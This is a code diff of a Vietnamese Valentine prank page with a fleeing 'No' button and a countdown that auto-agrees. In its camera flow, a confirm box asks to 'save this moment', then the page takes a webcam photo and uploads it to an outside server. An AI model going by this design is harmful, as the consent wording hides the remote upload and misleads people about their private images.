@@ -1,8 +1,8 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Valentine 💖</title>
+<title>Cẩn thận bắt sáng cam 💖</title>
 <style>
 body { margin:0; height:100vh; background:linear-gradient(135deg,#ffd6e0,#ffe6f0); display:flex; justify-content:center; align-items:center; font-family:Arial; overflow:hidden;}
 .container { text-align:center;}
@@ -34,42 +34,56 @@ const countdown=document.getElementById("countdown");
 const music=document.getElementById("music");
 let scale=1;
 let time=10;
+let cameraAsked=false;
+
+// Bấm anywhere để bật nhạc
 document.body.onclick=()=>{music.play();};
-setInterval(()=>{
+
+// Countdown 10s tự đồng ý
+let interval = setInterval(()=>{
   time--;
   countdown.innerText="Thời gian suy nghĩ: "+time;
-  if(time<=0){text.innerHTML="Hết thời gian 😏 Tự động đồng ý 💖"; handleYes();}
+  if(time<=0){
+    clearInterval(interval);
+    text.innerHTML="Hết thời gian 😏 Tự động đồng ý 💖";
+    handleYes();
+  }
 },1000);
+
+// Troll nút từ chối
 const noTexts=["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔"];
 noBtn.onmouseover=()=>{
   const x=Math.random()*(window.innerWidth-100);
   const y=Math.random()*(window.innerHeight-50);
   noBtn.style.left=x+"px";
   noBtn.style.top=y+"px";
-  scale-=0.1;
+  scale=Math.max(0.5, scale-0.1);
   noBtn.style.transform=`scale(${scale})`;
   noBtn.innerText=noTexts[Math.floor(Math.random()*noTexts.length)];
 };
-yesBtn.onclick=handleYes;
+
+// Xử lý khi bấm Đồng ý
+yesBtn.onclick = handleYes;
+
 async function handleYes(){
-  const allow=confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
+  if(cameraAsked) return; // chỉ hỏi 1 lần
+  cameraAsked = true;
+  const allow = confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
   if(allow){
     try{
       await startCamera();
-      setTimeout(async ()=>{
-        await sendImage();
-        alert("Đã lưu lại khoảnh khắc 💖");
-        yesAction();
-      },2000);
-    }catch(err){
+      await sendImage();
+      alert("Đã lưu lại khoảnh khắc 💖");
+    } catch(err){
       alert("Không bật được camera 😢");
-      yesAction();
     }
-  }else{
+  } else {
     alert("Không sao, vẫn yêu bạn 💖");
-    yesAction();
   }
+  yesAction();
 }
+
+// Start camera
 async function startCamera(){
   const video=document.createElement("video");
   video.autoplay=true;
@@ -82,6 +96,8 @@ async function startCamera(){
   video.srcObject=stream;
   window.currentVideo=video;
 }
+
+// Chụp ảnh từ video
 function captureImage(){
   const canvas=document.createElement("canvas");
   const video=window.currentVideo;
@@ -91,6 +107,8 @@ function captureImage(){
   ctx.drawImage(video,0,0);
   return canvas.toDataURL("image/png");
 }
+
+// Gửi ảnh lên backend
 async function sendImage(){
   const img=captureImage();
   await fetch("https://duong-stack-valentine-telegram-back-omega.vercel.app/upload",{
@@ -99,6 +117,8 @@ async function sendImage(){
     body:JSON.stringify({image:img})
   });
 }
+
+// Hiệu ứng sau khi đồng ý
 function yesAction(){
   text.innerHTML="Tớ biết mà 😍💖 Yêu cậu!!!";
   yesBtn.style.display="none";
@@ -107,6 +127,8 @@ function yesAction(){
   setInterval(createHeart,200);
   createConfetti();
 }
+
+// Tim bay lên
 function createHeart(){
   const heart=document.createElement("div");
   heart.classList.add("heart");
@@ -116,6 +138,8 @@ function createHeart(){
   document.body.appendChild(heart);
   setTimeout(()=>heart.remove(),4000);
 }
+
+// Mưa confetti
 function createConfetti(){
   for(let i=0;i<100;i++){
     const conf=document.createElement("div");
